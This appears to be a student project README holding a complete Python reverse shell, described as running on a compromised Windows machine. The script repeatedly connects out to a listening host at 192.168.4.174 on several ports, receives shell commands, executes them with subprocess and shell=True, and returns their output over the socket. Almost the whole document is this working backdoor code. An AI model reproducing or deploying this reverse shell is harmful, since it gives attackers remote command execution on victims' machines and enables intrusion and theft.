# PythonScriptProject4
On a compromised window machine we have a python script that connects to a listening port on a linux machine. This python script will execute a command specified by our linux machine.


import time
import socket
import subprocess


def recvall(s):
   data=s.recv(1)
   s.setblocking(0)
   starter=time.time()
   print('loop start')
   while time.time()-starter<2: #time calls for 2 seconds
      try:
         newdata=s.recv(2048) 
         if newdata==0:#s.recieve 0 if connection is terminated. s.recieve throws an erorr if live but no new data
            break
      except socket.error: 
         pass
      else: 
         data+=newdata
         starter=time.time()#if it recieves data restarts
   s.setblocking(1)#when blocking is on s.recieve will hang until data is recieved
   return data.decode()


def myconn(s,dat):
   connected=False #will continue to try to make connections as long as connected=false
   while not connected:
      for port in dat[1]:
         try:
            print('try port',port)
            s.connect((dat[0],port))
         except socket.error:
            print('Could not connect') 
            time.sleep(1)
            continue 
         else:
            print('connected') 
            connected=True 
            break


def main(dat): #calls main with argument which is tuple
  
   while True:
      s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      myconn(s,dat)
      time.sleep(1)
      cmd=recvall(s)
      if cmd == 'finn\n':
         s.close()
         break
   
      print(cmd)
      subby=subprocess.Popen(cmd,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
      
      output,error=subby.communicate()#subprocess.popen as a shell command the output is then captured with subby.communicate
      print(output)
      
      s.send(output)# Sends proccess output to listening socket on kali
   
      s.close()

main(('192.168.4.174',[432,567,34395]))
